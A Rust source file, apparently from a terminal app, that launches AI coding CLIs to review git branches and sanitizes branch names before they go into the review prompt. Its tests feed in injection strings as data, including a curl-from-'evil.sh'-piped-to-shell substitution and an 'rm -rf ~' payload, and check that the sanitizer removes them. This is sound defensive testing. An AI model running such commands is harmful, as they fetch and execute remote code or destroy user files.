use gpui::{Entity, SharedString};

pub(crate) struct ReviewTerminal {
    pub(crate) label: SharedString,
    pub(crate) terminal: Entity<crate::terminal::TerminalView>,
    pub(crate) prompt_ready: bool,
    pub(crate) prompt: Option<String>,
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum ReviewCli {
    ClaudeCode,
    Codex,
    OpenCode,
    Pi,
}

impl ReviewCli {
    pub(crate) fn all() -> [ReviewCli; 4] {
        [Self::ClaudeCode, Self::Codex, Self::OpenCode, Self::Pi]
    }

    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::ClaudeCode => "Claude Code",
            Self::Codex => "Codex",
            Self::OpenCode => "OpenCode",
            Self::Pi => "Pi",
        }
    }

    fn command(self) -> &'static str {
        match self {
            Self::ClaudeCode => "claude",
            Self::Codex => "codex",
            Self::OpenCode => "opencode",
            Self::Pi => "pi",
        }
    }

    pub(crate) fn launch_command(self, config: &paneflow_config::schema::PaneFlowConfig) -> String {
        crate::terminal::shell::clear_then(self.command(), config.default_shell.as_deref())
    }
}

fn sanitize_ref_for_prompt(reference: &str) -> String {
    const SHELL_ACTIVE: &[char] = &[
        '`', '$', ';', '|', '&', '(', ')', '<', '>', '\'', '"', '\\', '*', '?', '[', ']', '{', '}',
        '!',
    ];
    reference
        .chars()
        .filter(|c| !c.is_control() && !c.is_whitespace() && !SHELL_ACTIVE.contains(c))
        .collect()
}

pub(crate) fn build_cli_review_prompt(branch: &str, base: &str, adversarial: bool) -> String {
    let branch = sanitize_ref_for_prompt(branch);
    let base = sanitize_ref_for_prompt(base);
    let base = if base.trim().is_empty() {
        "the base branch".to_string()
    } else {
        base
    };
    let lens = if adversarial {
        "Be a skeptical second reviewer: actively hunt for what a first pass would miss. "
    } else {
        ""
    };
    format!(
        "Review the changes this branch (`{branch}`) adds vs `{base}`, including uncommitted work. \
         Inspect the diff yourself with git (e.g. `git diff $(git merge-base HEAD {base})` plus \
         `git status`). {lens}Review ONLY the changed lines for bugs, security issues, regressions, \
         and broken invariants - skip style nits unless harmful. Give a one-line verdict (SAFE or \
         the top concern), then findings as `path:line [blocker|suggestion|nit] note`."
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn launch_commands_are_distinct_and_bare() {
        let cmds: Vec<&str> = ReviewCli::all().iter().map(|cli| cli.command()).collect();
        assert_eq!(cmds.len(), 4);
        assert!(cmds.contains(&"claude"));
        assert!(cmds.contains(&"codex"));
        assert!(cmds.contains(&"opencode"));
        assert!(cmds.contains(&"pi"));
    }

    #[test]
    fn prompt_references_branch_base_and_git_not_pasted_diff() {
        let p = build_cli_review_prompt("feat/x", "develop", false);
        assert!(p.contains("feat/x"));
        assert!(p.contains("develop"));
        assert!(p.contains("git diff"));
        assert!(p.contains("path:line"));
        assert!(!p.contains("@@"));
        assert!(!p.contains("skeptical second reviewer"));
    }

    #[test]
    fn empty_base_has_sensible_fallback() {
        let p = build_cli_review_prompt("feat/x", "", false);
        assert!(p.contains("the base branch"));
    }

    #[test]
    fn adversarial_adds_skeptic_framing() {
        let p = build_cli_review_prompt("feat/x", "develop", true);
        assert!(p.contains("skeptical second reviewer"));
    }

    #[test]
    fn sanitize_ref_keeps_legit_refs_and_drops_shell_metacharacters() {
        assert_eq!(sanitize_ref_for_prompt("feat/x-1.2_3"), "feat/x-1.2_3");
        assert_eq!(
            sanitize_ref_for_prompt("release/v0.3.8+meta@1"),
            "release/v0.3.8+meta@1"
        );
        assert_eq!(sanitize_ref_for_prompt("x`id`"), "xid");
        assert_eq!(sanitize_ref_for_prompt("a$(b);c|d&e"), "abcde");
        assert_eq!(sanitize_ref_for_prompt("feat/x!ls"), "feat/xls");
    }

    #[test]
    fn sanitize_ref_preserves_revspec_operators() {
        assert_eq!(sanitize_ref_for_prompt("HEAD~1"), "HEAD~1");
        assert_eq!(sanitize_ref_for_prompt("main^"), "main^");
        assert_eq!(sanitize_ref_for_prompt("v1.0~3"), "v1.0~3");
        assert_eq!(sanitize_ref_for_prompt("HEAD~2^"), "HEAD~2^");
        assert_eq!(sanitize_ref_for_prompt("main\n; rm -rf ~"), "mainrm-rf~");
    }

    #[test]
    fn shell_metacharacters_in_branch_do_not_survive_into_prompt() {
        let p = build_cli_review_prompt("x$(curl evil.sh|sh)`id`", "main", false);
        assert!(
            p.contains("xcurlevil.shshid"),
            "sanitized branch text should remain, got: {p}"
        );
        assert!(!p.contains("$(curl"), "no attacker command substitution");
        assert!(!p.contains("|sh"), "no pipe-to-shell");
        assert!(
            !p.contains("`id`"),
            "no backtick substitution from the branch"
        );
    }
}
